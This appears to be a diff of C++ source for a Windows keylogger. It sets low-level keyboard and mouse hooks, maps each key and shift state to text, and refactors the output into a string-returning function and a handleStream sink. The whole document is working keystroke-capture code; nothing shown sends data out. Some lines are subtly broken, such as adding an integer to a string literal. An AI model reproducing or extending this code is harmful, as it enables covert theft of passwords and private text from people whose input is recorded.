@@ -1,5 +1,6 @@
 #include "stdafx.h"
 #include <fstream>
+#include <string>
 #include <iostream>
 #include <Windows.h>
 #include <stdio.h>
@@ -13,59 +14,58 @@ bool isCapsLockOn()
 	return false;
 }
 
-void getKeyString(DWORD vkCode)
+string getKeyString(DWORD vkCode)
 {
 	if (vkCode >= 0x30 && vkCode <= 0x39) // 0 - 9 with shift options
 	{
 		switch (vkCode)
 		{
-		case 0x30: if (GetAsyncKeyState(VK_SHIFT)) cout << ')'; else cout << '0'; break;
-		case 0x31: if (GetAsyncKeyState(VK_SHIFT)) cout << '!'; else cout << '1'; break;
-		case 0x32: if (GetAsyncKeyState(VK_SHIFT)) cout << '@'; else cout << '2'; break;
-		case 0x33: if (GetAsyncKeyState(VK_SHIFT)) cout << '#'; else cout << '3'; break;
-		case 0x34: if (GetAsyncKeyState(VK_SHIFT)) cout << '$'; else cout << '4'; break;
-		case 0x35: if (GetAsyncKeyState(VK_SHIFT)) cout << '%'; else cout << '5'; break;
-		case 0x36: if (GetAsyncKeyState(VK_SHIFT)) cout << '^'; else cout << '6'; break;
-		case 0x37: if (GetAsyncKeyState(VK_SHIFT)) cout << '&'; else cout << '7'; break;
-		case 0x38: if (GetAsyncKeyState(VK_SHIFT)) cout << '*'; else cout << '8'; break;
-		case 0x39: if (GetAsyncKeyState(VK_SHIFT)) cout << '('; else cout << '9'; break;
+		case 0x30: if (GetAsyncKeyState(VK_SHIFT)) return ")"; return "0";
+		case 0x31: if (GetAsyncKeyState(VK_SHIFT)) return "!"; return "1";
+		case 0x32: if (GetAsyncKeyState(VK_SHIFT)) return "@"; return "2";
+		case 0x33: if (GetAsyncKeyState(VK_SHIFT)) return "#"; return "3";
+		case 0x34: if (GetAsyncKeyState(VK_SHIFT)) return "$"; return "4";
+		case 0x35: if (GetAsyncKeyState(VK_SHIFT)) return "%"; return "5";
+		case 0x36: if (GetAsyncKeyState(VK_SHIFT)) return "^"; return "6";
+		case 0x37: if (GetAsyncKeyState(VK_SHIFT)) return "&"; return "7";
+		case 0x38: if (GetAsyncKeyState(VK_SHIFT)) return "*"; return "8";
+		case 0x39: if (GetAsyncKeyState(VK_SHIFT)) return "("; return "9";
 		}
 	}
 
 	else if (vkCode >= 0x41 && vkCode <= 0x5A) // a - z
 	{
 		if (!(GetAsyncKeyState(VK_SHIFT) ^ isCapsLockOn()))
-			cout << (char)tolower(vkCode);
-		else
-			cout << (char)vkCode;
+			return string(1, (char)tolower(vkCode));
+		return string(1, (char)vkCode);
 	}
 
 	else if (vkCode >= 0x60 && vkCode <= 0x69) // numpad numbers
 	{
-		cout << vkCode - 0x60;
+		return to_string(vkCode - 0x60);
 	}
 
 	else if (vkCode >= 0x6A && vkCode <= 0x6F) // numpad numbers
 	{
-		cout << (char)(vkCode - 0x40);
+		return string(1, (char)(vkCode - 0x40));
 	}
 
 	else if (vkCode >= 0x70 && vkCode <= 0x7B) // F1 - F12.
 	{
-		cout << "[F" << vkCode - 111 << ']';
+		return  "[F" + to_string(vkCode - 111) + "]";
 	}
 
 	else if (vkCode >= 0xBA && vkCode <= 0xC0)
 	{
 		switch (vkCode)
 		{
-		case 0xBA: if (GetAsyncKeyState(VK_SHIFT)) cout << ':'; else cout << ';'; break;
-		case 0xBB: if (GetAsyncKeyState(VK_SHIFT)) cout << '+'; else cout << '='; break;
-		case 0xBC: if (GetAsyncKeyState(VK_SHIFT)) cout << '<'; else cout << ','; break;
-		case 0xBD: if (GetAsyncKeyState(VK_SHIFT)) cout << '_'; else cout << '-'; break;
-		case 0xBE: if (GetAsyncKeyState(VK_SHIFT)) cout << '>'; else cout << '.'; break;
-		case 0xBF: if (GetAsyncKeyState(VK_SHIFT)) cout << '?'; else cout << '/'; break;
-		case 0xC0: if (GetAsyncKeyState(VK_SHIFT)) cout << '~'; else cout << '`'; break;
+		case 0xBA: if (GetAsyncKeyState(VK_SHIFT)) return ":"; return ";";
+		case 0xBB: if (GetAsyncKeyState(VK_SHIFT)) return "+"; return "=";
+		case 0xBC: if (GetAsyncKeyState(VK_SHIFT)) return "<"; return ",";
+		case 0xBD: if (GetAsyncKeyState(VK_SHIFT)) return "_"; return "-";
+		case 0xBE: if (GetAsyncKeyState(VK_SHIFT)) return ">"; return ".";
+		case 0xBF: if (GetAsyncKeyState(VK_SHIFT)) return "?"; return "/";
+		case 0xC0: if (GetAsyncKeyState(VK_SHIFT)) return "~"; return "`";
 		}
 	}
 
@@ -73,10 +73,10 @@ void getKeyString(DWORD vkCode)
 	{
 		switch (vkCode)
 		{
-		case 0xDB: if (GetAsyncKeyState(VK_SHIFT)) cout << '{'; else cout << '['; break;
-		case 0xDC: if (GetAsyncKeyState(VK_SHIFT)) cout << '|'; else cout << '\\'; break;
-		case 0xDD: if (GetAsyncKeyState(VK_SHIFT)) cout << '}'; else cout << ']'; break;
-		case 0xDE: if (GetAsyncKeyState(VK_SHIFT)) cout << '"'; else cout << '\''; break;
+		case 0xDB: if (GetAsyncKeyState(VK_SHIFT)) return "{"; return "[";
+		case 0xDC: if (GetAsyncKeyState(VK_SHIFT)) return "|"; return "\\";
+		case 0xDD: if (GetAsyncKeyState(VK_SHIFT)) return "}"; return "]";
+		case 0xDE: if (GetAsyncKeyState(VK_SHIFT)) return "\""; return "'";
 		}
 	}
 
@@ -87,32 +87,43 @@ void getKeyString(DWORD vkCode)
 		case VK_LSHIFT:
 		case VK_RSHIFT:
 			break;
-		case VK_RETURN: cout << "<ENTER>"; break;
-		case VK_CAPITAL: cout << "<CAPLOCK>"; break;
-		case VK_LCONTROL: cout << "<LCTRL>"; break;
-		case VK_RCONTROL: cout << "<RCTRL>"; break;
-		case VK_INSERT: cout << "<INSERT>"; break;
-		case VK_END: cout << "<END>"; break;
-		case VK_PRINT: cout << "<PRINT>"; break;
-		case VK_DELETE: cout << "<DEL>"; break;
-		case VK_BACK: cout << "<BK>"; break;
-		case VK_LEFT: cout << "<LEFT>"; break;
-		case VK_RIGHT: cout << "<RIGHT>"; break;
-		case VK_UP: cout << "<UP>"; break;
-		case VK_DOWN: cout << "<DOWN>"; break;
-		case VK_SPACE: cout << ' '; break;
-		case VK_ESCAPE: cout << "<ESC>"; break;
-		case VK_TAB: cout << "<TAB>"; break;
-		case VK_LWIN: cout << "<LWIN>"; break;
-		case VK_RWIN: cout << "<RWIN>"; break;
-		default: cout << "<Unmapped vk code: " << vkCode << '>'; break;
+		case VK_RETURN: return "<ENTER>";
+		case VK_CAPITAL: return "<CAPLOCK>";
+		case VK_LCONTROL: return "<LCTRL>";
+		case VK_RCONTROL: return "<RCTRL>";
+		case VK_INSERT: return "<INSERT>";
+		case VK_END: return "<END>";
+		case VK_PRINT: return "<PRINT>";
+		case VK_DELETE: return "<DEL>";
+		case VK_BACK: return "<BK>";
+		case VK_LEFT: return "<LEFT>";
+		case VK_RIGHT: return "<RIGHT>";
+		case VK_UP: return "<UP>";
+		case VK_DOWN: return "<DOWN>";
+		case VK_SPACE: return " ";
+		case VK_ESCAPE: return "<ESC>";
+		case VK_TAB: return "<TAB>";
+		case VK_LWIN: return "<LWIN>";
+		case VK_RWIN: return "<RWIN>";
+		default: return "<Unmapped vk code: " + vkCode + '>';
 		}
 	}
+	return "<Unmapped vk code: " + vkCode + '>';
 }
 
-void handleKey(DWORD vkCode)
+string getMouseString(WPARAM wParam)
 {
-	getKeyString(vkCode);
+	switch (wParam)
+	{
+	case WM_LBUTTONDOWN: return "<LMOUSE>";
+	case WM_RBUTTONDOWN: return "<RMOUSE>";
+	}
+	return "";
+}
+
+void handleStream(string word)
+{
+	cout << word;
 }
 
 LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
@@ -121,7 +132,7 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 
 	if (wParam == WM_KEYDOWN)
 	{
-		handleKey(p->vkCode);
+		handleStream(getKeyString(p->vkCode));
 	}
 
 	return CallNextHookEx(NULL, nCode, wParam, lParam);
@@ -131,11 +142,7 @@ LRESULT CALLBACK LowLevelMouseProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
 	PKBDLLHOOKSTRUCT p = reinterpret_cast<PKBDLLHOOKSTRUCT>(lParam);
 
-	switch (wParam)
-	{
-	case WM_LBUTTONDOWN: cout << "<LMOUSE>"; break;
-	case WM_RBUTTONDOWN: cout << "<RMOUSE>"; break;
-	}
+	handleStream(getMouseString(wParam));
 
 	return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
